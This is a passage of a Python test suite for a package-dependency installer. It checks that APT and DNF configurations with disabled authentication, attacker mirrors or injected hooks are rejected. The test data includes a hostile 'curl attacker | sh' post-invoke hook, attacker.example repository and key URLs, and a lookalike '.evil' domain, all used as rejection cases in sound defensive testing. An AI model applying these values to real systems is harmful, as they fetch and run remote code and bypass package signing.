        for value in ('deb [trusted=yes] https://archive.ubuntu.com/ubuntu noble main',
                'APT::Get::AllowUnauthenticated "true";',
                'Acquire::AllowInsecureRepositories "true";',
                'Acquire::https::Verify-Peer "false";',
                'APT::Update::Post-Invoke {"curl attacker | sh";};',
                'Dir::Etc::sourceparts "/project";'):
            with self.subTest(value=value):
                self.rejected(lambda: self.d.dependency_apt_options(value))
        self.assertEqual(1, self.d.dependency_apt_sources('deb https://archive.ubuntu.com/ubuntu noble main'))
        self.d.OS_PROFILE = {'id': 'debian', 'version': '13', 'manager': 'APT'}
        self.assertEqual(1, self.d.dependency_apt_sources('Types: deb\nURIs: https://deb.debian.org/debian\nSuites: stable\nComponents: main\n'))

    def test_dnf_authentication_and_untrusted_source_are_rejected(self):
        self.d.OS_PROFILE = {'id': 'centos', 'version': '9', 'manager': 'DNF'}
        base = '[baseos]\nbaseurl=https://mirror.stream.centos.org/$stream/BaseOS/$basearch/os/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial\n'
        with mock.patch.object(self.d, 'dependency_key'):
            self.assertEqual(1, self.d.dependency_dnf_config(base, True))
            for value in (base.replace('gpgcheck=1', 'gpgcheck=0'), base + 'sslverify=0\n',
                    base.replace('mirror.stream.centos.org', 'attacker.example'), base + 'reposdir=/project\n'):
                self.rejected(lambda: self.d.dependency_dnf_config(value, True))

    def test_apt_source_authentication_requires_explicit_safe_values_in_both_formats(self):
        def sources(key, value):
            return ('deb [' + key + '=' + value + '] https://archive.ubuntu.com/ubuntu noble main',
                'Types: deb\nURIs: https://archive.ubuntu.com/ubuntu\nSuites: noble\n' + key + ': ' + value + '\n')
        for key, safe, unsafe in (
            ('trusted', ('no', 'false', 'without', 'off', 'disable', '0'), ('yes', 'true', 'with', 'on', 'enable', '1', '01', '0x1', '+1', 'unknown', '')),
            ('check-valid-until', ('yes', 'true', 'with', 'on', 'enable', '1'), ('no', 'false', 'without', 'off', 'disable', '0', 'unknown', ''))):
            for value in safe:
                for source in sources(key, value):
                    with self.subTest(key=key, value=value, format=source[:3]):
                        self.assertEqual(1, self.d.dependency_apt_sources(source))
            for value in unsafe:
                for source in sources(key, value):
                    with self.subTest(key=key, value=value, format=source[:3]):
                        self.rejected(lambda: self.d.dependency_apt_sources(source))
        self.rejected(lambda: self.d.dependency_apt_sources('deb [trusted=no trusted=on] https://archive.ubuntu.com/ubuntu noble main'))

    def test_disabled_crb_is_authenticated_before_the_transaction_enables_it(self):
        self.d.OS_PROFILE = {'id': 'centos', 'version': '9', 'manager': 'DNF'}
        key = 'file:///etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial'
        value = '[crb]\nenabled=0\nbaseurl=https://mirror.stream.centos.org/$stream/CRB/$basearch/os/\ngpgcheck=1\ngpgkey=' + key + '\n'
        with mock.patch.object(self.d, 'dependency_key') as checked:
            self.assertEqual(1, self.d.dependency_dnf_config(value, True))
            checked.assert_called_once_with(key, 'DNF')
        for changed in (value.replace('gpgcheck=1', 'gpgcheck=0'),
            value.replace('mirror.stream.centos.org', 'attacker.example'),
            value.replace(key, 'https://attacker.example/key'), value.replace('gpgkey=' + key + '\n', '')):
            self.rejected(lambda: self.d.dependency_dnf_config(changed, True))
        self.assertEqual(0, self.d.dependency_dnf_config(value.replace('[crb]', '[unused]'), True))

    def test_package_versions_are_complete_exact_unique_and_bounded(self):
        packages = self.d.dependency_packages('APT', 'RUBY')
        output = ''.join(package + '\t1:2.3-4ubuntu5\n' for package in packages)
        self.assertEqual(set(packages), set(self.d.dependency_versions(output, packages)))
        for value in (output + packages[0] + '\t1\n', output + 'model-package\t1\n',
                output.splitlines()[0] + '\n', output.replace('1:2.3-4ubuntu5', 'secret\ntrailer', 1)):
            self.rejected(lambda: self.d.dependency_versions(value, packages))

    def test_transaction_uses_actual_packaged_names_forces_auth_and_has_one_receipt(self):
        packages = self.d.dependency_packages('APT', 'PHP')
        commands = []
        def run(command):
            commands.append(command)
            return ''.join(name + '\t1.0-1\n' for name in packages) if 'dpkg-query' in command[0] else ''
        stream = io.StringIO()
        with mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.d, 'dependency_profile', return_value=self.d.OS_PROFILE), mock.patch.object(self.d, 'dependency_validate_apt'), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run), contextlib.redirect_stdout(stream):
            self.d.dependency_main(['PHP', OPERATION])
        line = stream.getvalue()
        self.assertEqual(1, len(line.splitlines()))
        value = json.loads(line.removeprefix('TOOLCHAIN_DEPENDENCIES='))
        self.assertEqual({'operation', 'ecosystem', 'manager', 'packages'}, set(value))
        self.assertEqual(OPERATION, value['operation'])
        self.assertEqual(set(packages), set(value['packages']))
        transaction = next(command for command in commands if 'install' in command)
        self.assertEqual(packages, transaction[-len(packages):])
        self.assertIn('APT::Get::AllowUnauthenticated=false', transaction)
        self.assertIn('Acquire::AllowInsecureRepositories=false', transaction)
        self.assertFalse(any('--allow-unauthenticated' in command for command in commands))

    def test_non_source_ecosystem_does_not_install_and_arbitrary_args_are_rejected(self):
        with mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.d, 'dependency_run') as commands, contextlib.redirect_stdout(io.StringIO()):
            self.d.dependency_main(['RUST', OPERATION])
            commands.assert_not_called()
            for args in (['RUBY', OPERATION, '--repo=attacker'], ['RUBY', '../op'], ['MODEL', OPERATION]):
                self.rejected(lambda: self.d.dependency_main(args))

    def test_os_profile_and_cross_distribution_sources_are_strict(self):
        for identity, version, manager in (('ubuntu', '24.04', 'APT'), ('debian', '12', 'APT'), ('centos', '10', 'DNF')):
            with mock.patch.object(self.d, 'dependency_text', return_value='ID=' + identity + '\nVERSION_ID="' + version + '"\n'):
                self.assertEqual(manager, self.d.dependency_profile()['manager'])
        for release in ('ID=ubuntu\nVERSION_ID=26.04\n', 'ID=model\nVERSION_ID=24.04\n',
                'ID=ubuntu\nID=debian\nVERSION_ID=12\n'):
            with mock.patch.object(self.d, 'dependency_text', return_value=release):
                self.rejected(self.d.dependency_profile)
        self.rejected(lambda: self.d.dependency_url('https://deb.debian.org/debian', 'APT'))
        self.rejected(lambda: self.d.dependency_url('https://archive.ubuntu.com.evil/ubuntu', 'APT'))

    def test_default_apt_paths_are_accepted_and_binary_overrides_rejected(self):
        defaults = 'Dir "/";\nDir::Etc "etc/apt";\nDir::Etc::sourcelist "sources.list";\nDir::Etc::sourceparts "sources.list.d";\nDir::Etc::trusted "trusted.gpg";\nDir::Etc::trustedparts "trusted.gpg.d";\nDir::Bin::dpkg "/usr/bin/dpkg";\n'
        with self.apt_paths():
            self.d.dependency_apt_options(defaults, effective=True)
            for value in (defaults.replace('"sources.list.d"', '"/project/repos"'),
                    defaults.replace('"/usr/bin/dpkg"', '"/project/root-script"'),
                    '#include "/project/hook";\n', 'APT::Solver "project";'):
                self.rejected(lambda: self.d.dependency_apt_options(value, effective=True))

    def test_effective_apt_tree_accepts_official_compressors_and_anonymous_directory_lists(self):
        dump = '''Dir::Bin "";
Dir::Bin::methods "/usr/lib/apt/methods";
Dir::Bin::dpkg "/usr/bin/dpkg";
Dir::Bin::solvers "";
Dir::Bin::solvers:: "/usr/lib/apt/solvers";
Dir::Bin::planners "";
Dir::Bin::planners:: "/usr/lib/apt/planners";
Dir::Bin::gzip "/bin/gzip";
Dir::Bin::bzip2 "/bin/bzip2";
Dir::Bin::xz "/usr/bin/xz";
Dir::Bin::lz4 "/usr/bin/lz4";
Dir::Bin::zstd "/usr/bin/zstd";
Dir::Bin::lzma "/usr/bin/xz";
APT::Solver "internal";
APT::Planner "internal";
'''
        with self.apt_paths(links={'/bin/gzip': '/usr/bin/gzip', '/bin/bzip2': '/usr/bin/bzip2'}) as checked:
            self.d.dependency_apt_options(dump, effective=True)
            self.d.dependency_apt_options(dump.replace('Dir::Bin::lzma "/usr/bin/xz"', 'Dir::Bin::lzma "/usr/bin/lzma"'), effective=True)
            self.d.dependency_apt_options('Dir::Bin::solvers "/usr/lib/apt/solvers";', effective=True)
        self.assertIn('/usr/lib/apt/solvers', checked)
        self.assertIn('/usr/lib/apt/planners', checked)
        self.assertIn('/bin/gzip', checked)
        self.assertIn('/usr/bin/lz4', checked)

    def test_effective_apt_binary_namespace_cannot_skip_digits_lists_or_malformed_values(self):
        for value in ('Dir::Bin::bzip2 "/project/execute";', 'Dir::Bin::lz4 "relative";',
                'Dir::Bin::unknown7 "/usr/bin/dpkg";', 'Dir::Bin::solvers:: "/project/solvers";',
                'Dir::Bin::planners::named "/usr/lib/apt/planners";', 'Dir::Bin::dpkg:: "/usr/bin/dpkg";',
                'Dir::Bin::gzip::extra "/bin/gzip";', 'Dir::Bin "/project";',
                'Dir::Bin::gzip "/bin/gzip\\escape";', 'Dir::Bin::gzip "/bin/gzip"; trailing',
                'APT::Solver "external";', 'APT::Planner "";',
                'Binary::apt-get::Dir::Bin::dpkg "/project/execute";',
                'Binary::apt-get::APT::Solver "external";',
                'Binary::apt-get::Dir::Etc::sourceparts "/project/repos";'):
            with self.subTest(value=value), self.apt_paths():
                with self.assertRaises(self.d.DependencyFailure) as rejected:
                    self.d.dependency_apt_options(value, effective=True)
                self.assertEqual('UNSUPPORTED_APT_BINARY', rejected.exception.detail)
        self.d.dependency_apt_options('Binary::apt::APT::Color "1";', effective=True)

    def test_optional_apt_tools_may_be_absent_only_beneath_a_protected_native_parent(self):
        for field, location in (('lz4', '/usr/bin/lz4'), ('bzip2', '/bin/bzip2'), ('apt-key', '/usr/bin/apt-key')):
            with self.subTest(field=field), self.apt_paths(missing=(location,)) as checked:
                self.d.dependency_apt_options('Dir::Bin::' + field + ' "' + location + '";', effective=True)
                self.assertIn(str(pathlib.PurePosixPath(location).parent), checked)
        for kwargs in ({'missing': ('/usr/bin/lz4',), 'unsafe': ('/usr/bin',)},
                {'missing': ('/usr/bin/lz4',), 'links': {'/usr/bin/lz4': '/missing/tool'}},
                {'unsafe': ('/usr/bin/lz4',)}, {'non_executable': ('/usr/bin/lz4',)},
                {'links': {'/usr/bin/lz4': '/project/root-owned-tool'}},
                {'links': {'/usr/bin/lz4': '/usr/bin'}}):
            with self.subTest(kwargs=kwargs), self.apt_paths(**kwargs):
                self.rejected(lambda: self.d.dependency_apt_options('Dir::Bin::lz4 "/usr/bin/lz4";', effective=True))
        for field, path in (('methods', '/usr/lib/apt/methods'), ('solvers::', '/usr/lib/apt/solvers'),
                ('planners::', '/usr/lib/apt/planners'), ('dpkg', '/usr/bin/dpkg')):
            with self.subTest(field=field), self.apt_paths(missing=(path,)):
                self.rejected(lambda: self.d.dependency_apt_options('Dir::Bin::' + field + ' "' + path + '";', effective=True))

    def test_apt_binary_diagnostic_reports_only_fixed_classification_and_current_digest(self):
        private = '/project/private-body-never-echo'
        with self.assertRaises(self.d.DependencyFailure) as rejected:
            self.d.dependency_apt_binaries('Dir::Bin::gzip "' + private + '";')
        output = io.StringIO()
        with mock.patch.object(self.d, 'dependency_main', side_effect=rejected.exception), contextlib.redirect_stdout(output):
            self.assertEqual(65, self.d.dependency_cli(['NATIVE_BUILD', OPERATION]))
        lines = output.getvalue().splitlines()
        self.assertEqual(2, len(lines))
        self.assertEqual('TOOLCHAIN_FAILURE=dependencies:UNSUPPORTED_APT_BINARY', lines[0])
        diagnostic = json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertEqual({'operation': OPERATION, 'phase': 'UNSUPPORTED_APT_BINARY', 'reason': 'PATH_OVERRIDE',
            'field': 'gzip', 'valueBytes': len(private.encode()), 'valueSha256': hashlib.sha256(private.encode()).hexdigest()}, diagnostic)
        self.assertNotIn(private, output.getvalue())
        self.assertIsNone(self.d.dependency_diagnostic_line(rejected.exception, ['NATIVE_BUILD', '../invalid']))
        for key, invalid in (('field', ['gzip']), ('field', 'private-key'), ('reason', ['PATH_OVERRIDE']),
                ('valueBytes', True), ('valueBytes', 1048577), ('valueSha256', 'private-body')):
            value = {key: data for key, data in diagnostic.items() if key not in ('operation', 'phase')}
            value[key] = invalid
            self.assertIsNone(self.d.dependency_diagnostic_line(self.d.DependencyFailure('UNSUPPORTED_APT_BINARY', diagnostic=value), ['NATIVE_BUILD', OPERATION]))

    def test_default_hook_requires_exact_registered_package_content(self):
        hook = 'DPkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};\n'
        path = '/etc/apt/apt.conf.d/70debconf'
        registered_path = str(pathlib.Path(path))
        digest = hashlib.md5(hook.encode()).hexdigest()
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        def protected(value): return status
        def run(command):
            if '-S' in command: return 'debconf: ' + registered_path + '\n'
            return ' ' + registered_path + ' ' + digest + '\n'
        with mock.patch.object(self.d, 'dependency_protected', protected), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run):
            self.d.dependency_apt_options(hook, path)
            self.rejected(lambda: self.d.dependency_apt_options(hook + '# modified\n', path))
        for owner, checksum in (('model-hook', digest), ('debconf', None), ('debconf', '0' * 32)):
            def bad_run(command):
                return owner + ': ' + registered_path + '\n' if '-S' in command else (
                    ' ' + registered_path + ' ' + checksum + '\n' if checksum is not None else '')
            with mock.patch.object(self.d, 'dependency_protected', protected), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', bad_run), mock.patch.object(self.d.pathlib.Path, 'exists', return_value=False):
                self.rejected(lambda: self.d.dependency_apt_options(hook, path))
        self.rejected(lambda: self.d.dependency_apt_options(hook))
        self.rejected(lambda: self.d.dependency_apt_options('DPkg::Pre-Install-Pkgs {"sh /project/script";};'))

    def test_binary_keyring_uses_registered_bytes_without_utf8_decode(self):
        content = b'\x99\xff\x00\x80binary-keyring'
        with mock.patch.object(self.d, 'dependency_bytes', return_value=content), mock.patch.object(self.d, 'dependency_registered') as registered:
            self.d.dependency_key('/usr/share/keyrings/ubuntu-archive-keyring.gpg', 'APT')
            registered.assert_called_once_with('/usr/share/keyrings/ubuntu-archive-keyring.gpg', {'ubuntu-keyring'}, content)
            self.rejected(lambda: self.d.dependency_key('/usr/share/keyrings/project.gpg', 'APT'))
            self.rejected(lambda: self.d.dependency_key('/usr/share/keyrings/debian-archive-keyring.gpg', 'APT'))

    def test_ubuntu_pro_hook_requires_original_os_path_owner_and_registered_content(self):
        path = '/etc/apt/apt.conf.d/20apt-esm-hook.conf'
        hook = 'APT::Update::Pre-Invoke {"systemctl start --no-block apt-news.service esm-cache.service || true";};\n'
        digest = hashlib.md5(hook.encode()).hexdigest()
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        for owner in ('ubuntu-pro-client', 'ubuntu-advantage-tools'):
            def run(command):
                registered_path = command[-1] if '-S' in command else str(pathlib.Path(path))
                return owner + ': ' + registered_path + '\n' if '-S' in command else ' ' + registered_path + ' ' + digest + '\n'
            with mock.patch.object(self.d, 'dependency_protected', return_value=status), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run):
                self.d.dependency_apt_options(hook, path)
                self.rejected(lambda: self.d.dependency_apt_options(hook + '# changed\n', path))
                self.rejected(lambda: self.d.dependency_apt_options(hook, '/etc/apt/apt.conf.d/99project'))
                self.d.OS_PROFILE = {'id': 'debian', 'version': '12', 'manager': 'APT'}
                self.rejected(lambda: self.d.dependency_apt_options(hook, path))
                self.d.OS_PROFILE = {'id': 'ubuntu', 'version': '24.04', 'manager': 'APT'}
                with mock.patch.object(self.d, 'dependency_run', return_value='project-owned: ' + str(pathlib.Path(path)) + '\n'):
                    self.rejected(lambda: self.d.dependency_apt_options(hook, path))
                with mock.patch.object(self.d, 'dependency_run', side_effect=[owner + ': ' + str(pathlib.Path(path)) + '\n', '']), mock.patch.object(self.d.pathlib.Path, 'exists', return_value=False):
                    self.rejected(lambda: self.d.dependency_apt_options(hook, path))

    def test_ubuntu_command_not_found_hook_requires_exact_os_path_owner_and_registered_content(self):
        path = '/etc/apt/apt.conf.d/50command-not-found'
        hook = 'APT::Update::Post-Invoke-Success {"/usr/lib/cnf-update-db > /dev/null || true";};\n'
        digest = hashlib.md5(hook.encode()).hexdigest()
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        def run(command):
            registered_path = command[-1] if '-S' in command else str(pathlib.Path(path))
            return 'command-not-found: ' + registered_path + '\n' if '-S' in command else ' ' + registered_path + ' ' + digest + '\n'
        with mock.patch.object(self.d, 'dependency_protected', return_value=status), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', run):
            self.d.dependency_apt_options(hook, path)
            self.rejected(lambda: self.d.dependency_apt_options(hook + '# changed\n', path))
            self.rejected(lambda: self.d.dependency_apt_options(hook, '/etc/apt/apt.conf.d/99project'))
            self.rejected(lambda: self.d.dependency_apt_options(hook, '/etc/apt/apt.conf.d/20apt-esm-hook.conf'))
            self.d.OS_PROFILE = {'id': 'debian', 'version': '12', 'manager': 'APT'}
            self.rejected(lambda: self.d.dependency_apt_options(hook, path))
            self.d.OS_PROFILE = {'id': 'ubuntu', 'version': '24.04', 'manager': 'APT'}
            with mock.patch.object(self.d, 'dependency_run', return_value='project-owned: ' + str(pathlib.Path(path)) + '\n'):
                self.rejected(lambda: self.d.dependency_apt_options(hook, path))
            with mock.patch.object(self.d, 'dependency_run', side_effect=['command-not-found: ' + str(pathlib.Path(path)) + '\n', '']), mock.patch.object(self.d.pathlib.Path, 'exists', return_value=False):
                self.rejected(lambda: self.d.dependency_apt_options(hook, path))

    def test_root_owned_unmanaged_and_project_hook_are_not_proven_by_permission(self):
        hook = 'APT::Update::Post-Invoke {"sh /project/custom";};\n'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        with mock.patch.object(self.d, 'dependency_protected', return_value=status), mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name), mock.patch.object(self.d, 'dependency_run', return_value='project-owned: /etc/apt/apt.conf.d/99project\n'):
            self.rejected(lambda: self.d.dependency_apt_options(hook, '/etc/apt/apt.conf.d/99project'))

    def test_native_build_uses_exact_single_packaged_manifest_for_both_managers(self):
        expected = {'APT': ['cmake', 'ninja-build', 'gcc', 'g++'],
                    'DNF': ['cmake', 'ninja-build', 'gcc', 'gcc-c++']}
        actual = json.loads(resource(AGENT / 'dependency-packages.json'))
        for manager, packages in expected.items():
            with self.subTest(manager=manager):
                self.assertEqual({'PYTHON', 'PHP', 'RUBY', 'NATIVE_BUILD'}, set(actual[manager]))
                self.assertEqual(packages, actual[manager]['NATIVE_BUILD'])
                self.assertEqual(packages, self.d.dependency_packages(manager, 'NATIVE_BUILD'))
        self.assertEqual(1, self.source.count('DEPENDENCY_PACKAGES='))

    def test_native_build_has_independent_authenticated_transaction_and_exact_receipt(self):
        for manager in ('APT', 'DNF'):
            packages = self.d.dependency_packages(manager, 'NATIVE_BUILD')
            commands = []
            profile = {'id': 'ubuntu' if manager == 'APT' else 'centos',
                       'version': '24.04' if manager == 'APT' else '9', 'manager': manager}
            def run(command):
                commands.append(command)
                if command[0].endswith('/dpkg-query') or command[0].endswith('/rpm'):
                    return ''.join(name + '\t1:2.0-1\n' for name in packages)
                return ''
            stream = io.StringIO()
            with (self.subTest(manager=manager),
                  mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True),
                  mock.patch.object(self.d, 'dependency_profile', return_value=profile),
                  mock.patch.object(self.d, 'dependency_validate_apt') as apt,
                  mock.patch.object(self.d, 'dependency_validate_dnf') as dnf,
                  mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
                  mock.patch.object(self.d, 'dependency_run', run),
                  contextlib.redirect_stdout(stream)):
                self.d.dependency_main(['NATIVE_BUILD', OPERATION])
                (apt if manager == 'APT' else dnf).assert_called_once_with()
                (dnf if manager == 'APT' else apt).assert_not_called()
            receipt = stream.getvalue()
            self.assertEqual(1, len(receipt.splitlines()))
            self.assertTrue(receipt.startswith('TOOLCHAIN_DEPENDENCIES='))
            value = json.loads(receipt.removeprefix('TOOLCHAIN_DEPENDENCIES='))
            self.assertEqual({'operation': OPERATION, 'ecosystem': 'NATIVE_BUILD', 'manager': manager,
                             'packages': {name: '1:2.0-1' for name in packages}}, value)
            transaction = next(command for command in commands if 'install' in command)
            self.assertEqual(packages, transaction[-len(packages):])
            if manager == 'APT':
                self.assertIn('APT::Get::AllowUnauthenticated=false', transaction)
                self.assertIn('Acquire::AllowInsecureRepositories=false', transaction)
            else:
                self.assertIn('--disableplugin=*', transaction)
                self.assertIn('--setopt=gpgcheck=1', transaction)
                self.assertIn('--setopt=sslverify=1', transaction)

    def test_native_build_rejects_forged_incomplete_or_duplicate_package_receipt(self):
        packages = self.d.dependency_packages('APT', 'NATIVE_BUILD')
        valid = ''.join(name + '\t2.0-1\n' for name in packages)
        for output in (valid + 'model-package\t1\n', valid + packages[0] + '\t1\n',
                       '\n'.join(valid.splitlines()[:-1]) + '\n', valid.replace('2.0-1', 'secret\nsuffix', 1)):
            with self.subTest(output=output):
                self.rejected(lambda: self.d.dependency_versions(output, packages))
        stream = io.StringIO()
        with (mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True),
              mock.patch.object(self.d, 'dependency_profile', return_value=self.d.OS_PROFILE),
              mock.patch.object(self.d, 'dependency_validate_apt'),
              mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
              mock.patch.object(self.d, 'dependency_run', side_effect=['', '', valid + 'model-package\t1\n']),
              contextlib.redirect_stdout(stream)):
            self.rejected(lambda: self.d.dependency_main(['NATIVE_BUILD', OPERATION]))
        self.assertEqual('', stream.getvalue())

    def test_native_build_refusal_and_extra_parameters_do_not_dispatch_or_emit_receipt(self):
        stream = io.StringIO()
        with (mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True),
              mock.patch.object(self.d, 'dependency_profile', return_value=self.d.OS_PROFILE),
              mock.patch.object(self.d, 'dependency_validate_apt', side_effect=self.d.DependencyFailure('UNAUTHENTICATED_APT_CONFIGURATION')),
              mock.patch.object(self.d, 'dependency_run') as run,
              contextlib.redirect_stdout(stream)):
            self.rejected(lambda: self.d.dependency_main(['NATIVE_BUILD', OPERATION]))
            for args in (['NATIVE_BUILD', OPERATION, 'model-package'], ['NATIVE_BUILD', '../op'],
                         ['native_build', OPERATION]):
                self.rejected(lambda: self.d.dependency_main(args))
            run.assert_not_called()
        self.assertEqual('', stream.getvalue())

    def test_rust_still_has_no_system_package_transaction_with_native_profile_present(self):
        stream = io.StringIO()
        with mock.patch.object(self.d.os, 'geteuid', return_value=0, create=True), mock.patch.object(self.d, 'dependency_profile') as profile, mock.patch.object(self.d, 'dependency_run') as run, contextlib.redirect_stdout(stream):
            self.d.dependency_main(['RUST', OPERATION])
            profile.assert_not_called()
            run.assert_not_called()
        receipt = json.loads(stream.getvalue().removeprefix('TOOLCHAIN_DEPENDENCIES='))
        self.assertEqual({'operation': OPERATION, 'ecosystem': 'RUST', 'manager': 'NONE', 'packages': {}}, receipt)

    def test_owner_failure_diagnostic_distinguishes_each_original_rejection(self):
        path = '/etc/apt/apt.conf.d/20owner'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        cases = [
            ('malformed PRIVATE_CONFIGURATION', 'RESPONSE_STRUCTURE', None),
            ('debconf: /different-path\n', 'PATH_MISMATCH', 'debconf'),
            ('debconf: ' + path + '\napt: ' + path + '\n', 'MULTIPLE_OWNERS', 'apt'),
            ('debconf, appstream: ' + path + '\n', 'OWNER_SYNTAX', None),
            ('', 'OWNER_ABSENT', None),
            ('unknown-owner: ' + path + '\n', 'OWNER_NOT_ALLOWED', 'unknown-owner'),
            ('X' * 8193, 'OUTPUT_LIMIT', None),
        ]
        for output, reason, owner in cases:
            with (self.subTest(reason=reason),
                  mock.patch.object(self.d, 'pathlib', types.SimpleNamespace(Path=pathlib.PurePosixPath)),
                  mock.patch.object(self.d, 'dependency_protected', return_value=status),
                  mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
                  mock.patch.object(self.d, 'dependency_run', return_value=output),
                  self.assertRaises(self.d.DependencyFailure) as failure):
                self.d.dependency_registered(path, {'apt', 'debconf'}, b'PRIVATE_CONFIGURATION')
            self.assertEqual('OS_CONFIGURATION_OWNER', failure.exception.detail)
            self.assertFalse(failure.exception.unknown)
            self.assertEqual({'reason': reason, 'path': path, 'owner': owner,
                'allowedOwners': ['apt', 'debconf']}, failure.exception.diagnostic)

    def test_owner_diagnostic_cli_binds_current_operation_and_preserves_failure_exit(self):
        path = '/etc/apt/apt.conf.d/20owner'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        stream = io.StringIO()
        def main(args):
            self.d.dependency_registered(path, self.d.HOOK_OWNERS, b'PRIVATE_CONFIG_KEY_BODY')
        with (mock.patch.object(self.d, 'pathlib', types.SimpleNamespace(Path=pathlib.PurePosixPath)),
              mock.patch.object(self.d, 'dependency_protected', return_value=status),
              mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
              mock.patch.object(self.d, 'dependency_run', return_value='unknown-owner: ' + path + '\n'),
              mock.patch.object(self.d, 'dependency_main', main),
              contextlib.redirect_stdout(stream)):
            code = self.d.dependency_cli(['NATIVE_BUILD', OPERATION])
        self.assertEqual(65, code)
        lines = stream.getvalue().splitlines()
        self.assertEqual(2, len(lines))
        self.assertEqual('TOOLCHAIN_FAILURE=dependencies:OS_CONFIGURATION_OWNER', lines[0])
        value = json.loads(lines[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertEqual({'operation', 'phase', 'reason', 'path', 'owner', 'allowedOwners'}, set(value))
        self.assertEqual(OPERATION, value['operation'])
        self.assertEqual('OS_CONFIGURATION_OWNER', value['phase'])
        self.assertEqual('OWNER_NOT_ALLOWED', value['reason'])
        self.assertEqual(path, value['path'])
        self.assertEqual('unknown-owner', value['owner'])
        self.assertEqual(sorted(self.d.HOOK_OWNERS), value['allowedOwners'])
        self.assertLessEqual(len(lines[1].encode()), 2048)
        self.assertNotIn('PRIVATE_CONFIG_KEY_BODY', stream.getvalue())
        self.assertNotIn('TOOLCHAIN_DEPENDENCIES=', stream.getvalue())

    def test_owner_diagnostic_suppresses_unknown_malicious_and_excess_metadata(self):
        good = {'reason': 'OWNER_NOT_ALLOWED', 'path': '/etc/apt/apt.conf.d/20owner',
                'owner': 'unknown-owner', 'allowedOwners': ['apt', 'debconf']}
        bad = [
            dict(good, reason='PRIVATE_REASON'),
            dict(good, path='/etc/apt/../../private'),
            dict(good, path='/etc/apt/key\nPRIVATE_KEY'),
            dict(good, path='relative-path'),
            dict(good, path='/' + 'a' * 512),
            dict(good, owner='owner\nPRIVATE_OUTPUT'),
            dict(good, owner='-not-a-package'),
            dict(good, owner='a' * 129),
            dict(good, allowedOwners=['model-package']),
            dict(good, allowedOwners=['apt', 'apt']),
            dict(good, stdout='PRIVATE_STDOUT'),
        ]
        for diagnostic in bad:
            with self.subTest(diagnostic=diagnostic):
                error = self.d.DependencyFailure('OS_CONFIGURATION_OWNER', diagnostic=diagnostic)
                self.assertIsNone(self.d.dependency_diagnostic_line(error, ['NATIVE_BUILD', OPERATION]))
        error = self.d.DependencyFailure('OS_CONFIGURATION_OWNER', diagnostic=good)
        for operation in ('../operation', 'A' * 32, OPERATION + '\nPRIVATE'):
            self.assertIsNone(self.d.dependency_diagnostic_line(error, ['NATIVE_BUILD', operation]))
        stream = io.StringIO()
        with mock.patch.object(self.d, 'dependency_main', side_effect=error), contextlib.redirect_stdout(stream):
            self.assertEqual(65, self.d.dependency_cli(['NATIVE_BUILD', '../operation']))
        self.assertEqual('TOOLCHAIN_FAILURE=dependencies:OS_CONFIGURATION_OWNER\n', stream.getvalue())

    def test_owner_diagnostic_does_not_leak_malformed_output_or_reuse_previous_operation(self):
        path = '/etc/apt/apt.conf.d/20owner'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        first, second = io.StringIO(), io.StringIO()
        def main(args):
            self.d.dependency_registered(path, {'apt'}, b'PRIVATE_CONFIGURATION')
        with (mock.patch.object(self.d, 'pathlib', types.SimpleNamespace(Path=pathlib.PurePosixPath)),
              mock.patch.object(self.d, 'dependency_protected', return_value=status),
              mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
              mock.patch.object(self.d, 'dependency_run', return_value='PRIVATE_KEY=SECRET no delimiter\n'),
              mock.patch.object(self.d, 'dependency_main', main),
              contextlib.redirect_stdout(first)):
            self.assertEqual(65, self.d.dependency_cli(['PHP', OPERATION]))
        value = json.loads(first.getvalue().splitlines()[1].removeprefix('TOOLCHAIN_DIAGNOSTIC='))
        self.assertIsNone(value['owner'])
        self.assertNotIn('PRIVATE_KEY', first.getvalue())
        self.assertNotIn('SECRET', first.getvalue())
        diagnostic = {'reason': 'OWNER_ABSENT', 'path': path, 'owner': None, 'allowedOwners': ['apt']}
        error = self.d.DependencyFailure('OS_CONFIGURATION_OWNER', True, diagnostic)
        with mock.patch.object(self.d, 'dependency_main', side_effect=error), contextlib.redirect_stdout(second):
            self.assertEqual(70, self.d.dependency_cli(['PHP', 'f' * 32]))
        self.assertEqual('TOOLCHAIN_FAILURE=unknown:OS_CONFIGURATION_OWNER\n', second.getvalue())
        self.assertNotIn(OPERATION, second.getvalue())

